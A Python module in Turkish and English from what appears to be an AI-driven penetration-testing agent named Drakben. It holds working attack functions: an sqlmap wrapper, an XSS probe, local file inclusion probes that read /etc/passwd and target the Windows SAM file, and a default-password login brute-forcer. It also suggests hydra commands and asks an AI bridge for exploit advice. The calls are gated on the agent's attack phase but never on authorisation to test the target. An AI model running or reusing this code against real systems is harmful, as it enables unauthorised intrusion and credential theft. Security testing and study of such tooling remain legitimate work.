# modules/exploit.py
# Drakben Exploit Modülü - STATE-AWARE İleri Seviye
# ZORUNLU: Exploit precondition modeli - koşul yoksa çalışmaz

import subprocess
import requests
import asyncio
from modules import ai_bridge
from core.tool_selector import ToolSelector

# State integration
try:
    from core.state import AgentState, AttackPhase
    STATE_AVAILABLE = True
except ImportError:
    STATE_AVAILABLE = False


def check_exploit_preconditions(state: 'AgentState', target: str, vuln_type: str) -> tuple[bool, str]:
    """
    Exploit precondition kontrolü - ZORUNLU
    
    Returns:
        (can_exploit, reason)
    """
    if not STATE_AVAILABLE or not state:
        return False, "State tracking is required for exploit execution"

    # STATE VALIDATION
    if STATE_AVAILABLE and state:
        if not state.validate():
            return False, "State invariant violation"
    
    # Precondition 1: Target must be set
    if not state.target:
        return False, "No target set"
    
    # Precondition 2: Must be in EXPLOIT or later phase
    if state.phase not in [AttackPhase.EXPLOIT, AttackPhase.FOOTHOLD, AttackPhase.POST_EXPLOIT]:
        return False, f"Wrong phase: {state.phase.value}, need EXPLOIT phase"
    
    # Precondition 3: Service must be open
    # Parse target for port
    if ":" in target:
        try:
            host, port_str = target.rsplit(":", 1)
            port = int(port_str)
            if port not in state.open_services:
                return False, f"Port {port} is not open on target"
        except ValueError:
            pass
    
    # Precondition 4: Check if vulnerability exists in state
    if vuln_type and state.vulnerabilities:
        has_vuln = any(vuln_type.lower() in v.vuln_id.lower() for v in state.vulnerabilities)
        if not has_vuln:
            return False, f"Vulnerability {vuln_type} not found in scan results"
    
    return True, "Preconditions satisfied"


# -------------------------
# SQL Injection (sqlmap)
# -------------------------
def run_sqlmap(target, param="id", level="1", state: 'AgentState' = None):
    """STATE-AWARE SQLmap execution (ToolSelector enforced)"""
    print(f"[Exploit] SQLmap başlatılıyor: {target}?{param}=1 (level={level})")

    if state is None:
        raise RuntimeError("State is required for exploit execution")

    # PRECONDITION CHECK
    can_run, reason = check_exploit_preconditions(state, target, "sqli")
    if not can_run:
        print(f"[Exploit] ❌ Precondition failed: {reason}")
        return {
            "type": "SQLi",
            "error": f"Precondition failed: {reason}",
            "blocked": True
        }

    # Enforce ToolSelector usage
    selector = ToolSelector()
    valid, vreason = selector.validate_tool_selection("sqlmap_scan", state)
    if not valid:
        raise RuntimeError(f"Tool selection blocked: {vreason}")

    cmd = [
        "sqlmap",
        "-u", f"{target}?{param}=1",
        "--batch",
        f"--level={level}"
    ]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        print("[Exploit] SQLmap çıktısı:")
        print(result.stdout)

        if result.returncode != 0:
            selector.record_tool_failure("sqlmap_scan")
            if selector.is_tool_blocked("sqlmap_scan"):
                raise RuntimeError("Tool sqlmap_scan blocked due to repeated failures")

        return {
            "type": "SQLi",
            "stdout": result.stdout,
            "stderr": result.stderr,
            "exit_code": result.returncode
        }

    except subprocess.TimeoutExpired:
        selector.record_tool_failure("sqlmap_scan")
        return {"type": "SQLi", "error": "SQLmap zaman aşımına uğradı."}
    except Exception as e:
        return {"type": "SQLi", "error": str(e)}

# -------------------------
# XSS Testi
# -------------------------
async def test_xss(target, param="q", state: 'AgentState' = None):
    print(f"[Exploit] XSS testi: {target}?{param}=<script>alert(1)</script>")
    # STATE VALIDATION handled in check_exploit_preconditions
    if state is None:
        raise RuntimeError("State is required for exploit execution")

    can_run, reason = check_exploit_preconditions(state, target, "xss")
    if not can_run:
        return {
            "type": "XSS",
            "error": f"Precondition failed: {reason}",
            "blocked": True
        }
    payload = "<script>alert(1)</script>"
    try:
        resp = requests.get(f"{target}?{param}={payload}", timeout=10)
        if payload in resp.text:
            return {"type": "XSS", "vulnerable": True, "payload": payload}
        else:
            return {"type": "XSS", "vulnerable": False}
    except Exception as e:
        return {"type": "XSS", "error": str(e)}

# -------------------------
# LFI Testi
# -------------------------
async def test_lfi(target, param="file", state: 'AgentState' = None):
    print(f"[Exploit] LFI testi: {target}?{param}=../../etc/passwd")
    # STATE VALIDATION handled in check_exploit_preconditions
    if state is None:
        raise RuntimeError("State is required for exploit execution")

    can_run, reason = check_exploit_preconditions(state, target, "lfi")
    if not can_run:
        return {
            "type": "LFI",
            "error": f"Precondition failed: {reason}",
            "blocked": True
        }
    payload = "../../etc/passwd"
    try:
        resp = requests.get(f"{target}?{param}={payload}", timeout=10)
        if "root:" in resp.text:
            return {"type": "LFI", "vulnerable": True, "payload": payload}
        else:
            return {"type": "LFI", "vulnerable": False}
    except Exception as e:
        return {"type": "LFI", "error": str(e)}

# -------------------------
# Basit Auth Bypass
# -------------------------
async def brute_force_login(target, username="admin", state: 'AgentState' = None):
    print(f"[Exploit] Basit brute force denemesi: {target}")
    # STATE VALIDATION handled in check_exploit_preconditions
    if state is None:
        raise RuntimeError("State is required for exploit execution")

    can_run, reason = check_exploit_preconditions(state, target, "auth_bypass")
    if not can_run:
        return {
            "type": "AuthBypass",
            "error": f"Precondition failed: {reason}",
            "blocked": True
        }
    passwords = ["admin", "123456", "password", "root", "toor"]
    for pwd in passwords:
        try:
            resp = requests.post(target, data={"username": username, "password": pwd}, timeout=10)
            if "dashboard" in resp.text.lower() or resp.status_code == 302:
                return {"type": "AuthBypass", "success": True, "username": username, "password": pwd}
        except Exception as e:
            return {"type": "AuthBypass", "error": str(e)}
    return {"type": "AuthBypass", "success": False}

# -------------------------
# AI Destekli Öneri
# -------------------------
async def ai_exploit_advice(recon_output, state: 'AgentState' = None):
    print("[Exploit] AI öneri motoru çalışıyor...")
    if state is None:
        return {"type": "AI", "error": "State tracking is required", "blocked": True}
    if not STATE_AVAILABLE or not state:
        return {"type": "AI", "error": "State tracking is required", "blocked": True}
    if not state.validate():
        return {"type": "AI", "error": "State invariant violation", "blocked": True, "invariant_violations": getattr(state, "invariant_violations", [])}
    advice = await ai_bridge.analyze_exploit_output(recon_output)
    return {"type": "AI", "advice": advice}

# -------------------------
# Suggest Exploit (Helper)
# -------------------------
def suggest_exploit(vulnerability_type, target=None):
    """
    Suggest appropriate exploit based on vulnerability type
    
    Args:
        vulnerability_type: Type of vulnerability (sqli, xss, lfi, auth_bypass)
        target: Optional target URL
    
    Returns:
        dict with exploit suggestions
    """
    suggestions = {
        "sqli": {
            "tool": "sqlmap",
            "command": f"sqlmap -u {target} --batch" if target else "sqlmap -u <target> --batch",
            "description": "SQL Injection automated exploitation"
        },
        "xss": {
            "tool": "manual",
            "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
            "description": "Cross-Site Scripting test payloads"
        },
        "lfi": {
            "tool": "manual",
            "payloads": ["../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"],
            "description": "Local File Inclusion test paths"
        },
        "auth_bypass": {
            "tool": "hydra",
            "command": f"hydra -L users.txt -P pass.txt {target} http-post-form" if target else "hydra -L users.txt -P pass.txt <target> http-post-form",
            "description": "Authentication brute force"
        }
    }
    
    return suggestions.get(vulnerability_type.lower(), {
        "error": f"Unknown vulnerability type: {vulnerability_type}",
        "available": list(suggestions.keys())
    })
